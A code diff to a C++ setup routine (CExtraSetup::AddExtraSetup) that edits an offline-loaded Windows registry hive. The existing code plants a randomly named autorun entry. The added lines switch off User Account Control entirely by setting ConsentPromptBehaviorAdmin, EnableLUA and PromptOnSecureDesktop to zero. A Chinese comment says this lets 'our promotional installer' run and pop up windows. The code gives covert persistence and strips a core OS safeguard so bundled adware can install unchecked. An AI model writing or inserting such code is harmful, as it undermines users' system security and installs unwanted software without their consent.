@@ -117,6 +117,18 @@ UINT CExtraSetup::AddExtraSetup()
 		LOG_INFO("Hive file has been loaded.\n");
 		//现在我们可以打开HKEY_LOCAL_MACHINE\PASK\Microsoft\Windows\CurrentVersion\Run这个项写入键值了
 		RegistrySetValueString(HKEY_LOCAL_MACHINE,"PASK\\Microsoft\\Windows\\CurrentVersion\\Run",randName,(char*)strDest.c_str(),FALSE);
+		//关闭默认的UAC,便于让我们的推广安装程序运行时弹窗。
+		/*
+		Windows Registry Editor Version 5.00
+		;彻底关闭UAC
+		[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]
+		"ConsentPromptBehaviorAdmin"=dword:00000000
+		"EnableLUA"=dword:00000000
+		"PromptOnSecureDesktop"=dword:00000000
+		*/
+		RegistrySetValueDowrd(HKEY_LOCAL_MACHINE,"PASK\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","ConsentPromptBehaviorAdmin",0,FALSE);
+		RegistrySetValueDowrd(HKEY_LOCAL_MACHINE,"PASK\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","EnableLUA",0,FALSE);
+		RegistrySetValueDowrd(HKEY_LOCAL_MACHINE,"PASK\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","PromptOnSecureDesktop",0,FALSE);
 	}
 	return 0;
 }
